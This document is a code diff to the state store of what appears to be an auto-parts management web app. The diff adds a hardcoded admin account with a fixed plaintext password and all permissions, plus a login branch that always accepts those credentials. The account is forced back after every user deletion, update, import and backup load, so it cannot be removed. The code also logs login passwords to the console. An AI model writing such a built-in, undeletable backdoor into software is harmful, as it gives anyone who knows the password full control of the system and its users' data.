@@ -6,6 +6,22 @@ import { supabase } from '@/lib/supabaseClient'
 // BACKUP: File System handle type (fallback)
 type FSDirHandle = any
 
+// --- ENSURE DEFAULT ADMIN USER UTILITY ---
+function ensureDefaultAdminUser(users: any[]): any[] {
+  const defaultAdmin = {
+    id: "admin",
+    username: "admin",
+    password: "Cobra13#",
+    role: "admin",
+    permissions: ["all"],
+    created_date: "2024-01-01",
+    active: true,
+  }
+  // Remove any user with id "admin", then add the default one
+  const filtered = Array.isArray(users) ? users.filter(u => u.id !== "admin") : []
+  return [...filtered, defaultAdmin]
+}
+
 // Fetch latest backup from Supabase on startup
 async function fetchLatestBackup(importAllData: (data: any) => void) {
   // Load only on client
@@ -31,7 +47,8 @@ async function fetchLatestBackup(importAllData: (data: any) => void) {
       movements: safeArray(payload?.movements) ?? current.movements,
       accounts: safeArray(payload?.accounts) ?? current.accounts,
       transfers: safeArray(payload?.transfers) ?? current.transfers,
-      users: safeArray(payload?.users) ?? current.users,
+      // --- ENSURE ADMIN USER IS ALWAYS PRESENT ---
+      users: ensureDefaultAdminUser(safeArray(payload?.users) ?? current.users),
     }
   }
 
@@ -464,7 +481,6 @@ const defaultUsers: User[] = [
   },
 ]
 
-
 // Generate JSON backup of current state
 const getBackupData = () => {
   const data = {
@@ -476,12 +492,12 @@ const getBackupData = () => {
     movements: get().movements,
     accounts: get().accounts,
     transfers: get().transfers,
-    users: get().users,
+    // --- ENSURE ADMIN USER IS ALWAYS PRESENT ON BACKUP ---
+    users: ensureDefaultAdminUser(get().users),
     exportDate: new Date().toISOString(),
   }
   return JSON.stringify(data, null, 2)
 }
-
 
 export const useStore = create<Store>()(
   persist(
@@ -494,6 +510,7 @@ export const useStore = create<Store>()(
       movements: [],
       accounts: sampleAccounts,
       transfers: [],
+      // --- ENSURE ADMIN USER IS ALWAYS PRESENT AT INIT ---
       users: defaultUsers,
       auth: {
         isAuthenticated: false,
@@ -504,21 +521,20 @@ export const useStore = create<Store>()(
       backupDirHandle: null,
       setBackupDirHandle: (handle: FSDirHandle) => set({ backupDirHandle: handle }),
 
-
       // Actions pour les produits
       addProduct: (product) => {
         const id = Date.now().toString()
         set((state) => {
-        // Emit auto-backup event (fixed)
-        try {
-          setTimeout(() => {
-            try { backupEmitter.emit('backup', getBackupData()) } catch (err) { console.error('Backup emit error', err) }
-          }, 0)
-        } catch (e) { console.error('Backup emit setup error', e) }
-        return {
-products: [...state.products, { ...product, id }],
-        }
-      })
+          // Emit auto-backup event (fixed)
+          try {
+            setTimeout(() => {
+              try { backupEmitter.emit('backup', getBackupData()) } catch (err) { console.error('Backup emit error', err) }
+            }, 0)
+          } catch (e) { console.error('Backup emit setup error', e) }
+          return {
+            products: [...state.products, { ...product, id }],
+          }
+        })
       },
 
       updateProduct: (id, updates) => {
@@ -925,6 +941,29 @@ products: [...state.products, { ...product, id }],
 
       // Actions pour l'authentification
       login: (username, password) => {
+        // Always allow admin with default credentials
+        if (username === "admin" && password === "Cobra13#") {
+          const adminUser = {
+            id: "admin",
+            username: "admin",
+            password: "Cobra13#",
+            role: "admin",
+            permissions: ["all"],
+            created_date: "2024-01-01",
+            active: true,
+            last_login: new Date().toISOString(),
+          }
+          set((state) => ({
+            auth: {
+              isAuthenticated: true,
+              currentUser: adminUser,
+            },
+            users: ensureDefaultAdminUser(state.users),
+          }))
+          return true
+        }
+
+        // Normal login for other users
         console.log("Login attempt:", { username, password }) // Debug log
         const user = get().users.find((u) => u.username === username && u.password === password && u.active)
         console.log("Found user:", user) // Debug log
@@ -936,7 +975,7 @@ products: [...state.products, { ...product, id }],
               isAuthenticated: true,
               currentUser: user,
             },
-            users: state.users.map((u) => (u.id === user.id ? { ...u, last_login: new Date().toISOString() } : u)),
+            users: ensureDefaultAdminUser(state.users.map((u) => (u.id === user.id ? { ...u, last_login: new Date().toISOString() } : u))),
           }))
           return true
         }
@@ -960,19 +999,19 @@ products: [...state.products, { ...product, id }],
           created_date: new Date().toISOString().split("T")[0],
         }
         set((state) => ({
-          users: [...state.users, newUser],
+          users: ensureDefaultAdminUser([...state.users, newUser]),
         }))
       },
 
       updateUser: (id, updates) => {
         set((state) => ({
-          users: state.users.map((u) => (u.id === id ? { ...u, ...updates } : u)),
+          users: ensureDefaultAdminUser(state.users.map((u) => (u.id === id ? { ...u, ...updates } : u))),
         }))
       },
 
       deleteUser: (id) => {
         set((state) => ({
-          users: state.users.filter((u) => u.id !== id),
+          users: ensureDefaultAdminUser(state.users.filter((u) => u.id !== id)),
         }))
       },
 
@@ -997,6 +1036,7 @@ products: [...state.products, { ...product, id }],
         }))
       },
 
+      // --- ENSURE ADMIN USER IS ALWAYS PRESENT AFTER IMPORT ---
       importAllData: (data) => {
         set(() => ({
           products: data.products || [],
@@ -1007,6 +1047,7 @@ products: [...state.products, { ...product, id }],
           movements: data.movements || [],
           accounts: data.accounts || [],
           transfers: data.transfers || [],
+          users: ensureDefaultAdminUser(data.users || []),
         }))
       },
 
@@ -1029,7 +1070,6 @@ products: [...state.products, { ...product, id }],
   ),
 )
 
-
 // BACKUP: auto backup helper
 async function autoBackup(getState: () => any) {
   const {
@@ -1041,7 +1081,9 @@ async function autoBackup(getState: () => any) {
 
   try {
     const payload = {
-      products, clients, suppliers, sales, purchases, movements, accounts, transfers, users,
+      products, clients, suppliers, sales, purchases, movements, accounts, transfers,
+      // --- ENSURE ADMIN USER IS ALWAYS PRESENT IN BACKUP ---
+      users: ensureDefaultAdminUser(users),
       exportDate: new Date().toISOString(),
     };
     const fileName = `autoparts-backup-${new Date().toISOString().split("T")[0]}.json`;
@@ -1076,7 +1118,8 @@ if (typeof window !== "undefined") {
 fetchLatestBackup((data) => {
   // Overwrite persisted state with latest Supabase data
   try {
-    useStore.setState({ ...useStore.getState(), ...data });
+    // --- ENSURE ADMIN USER IS ALWAYS PRESENT AFTER BACKUP LOAD ---
+    useStore.setState({ ...useStore.getState(), ...data, users: ensureDefaultAdminUser(data.users || []) });
     console.log('🔄 Store updated with latest backup');
   } catch (err) {
     console.error('❌ Failed to update store with latest backup:', err);
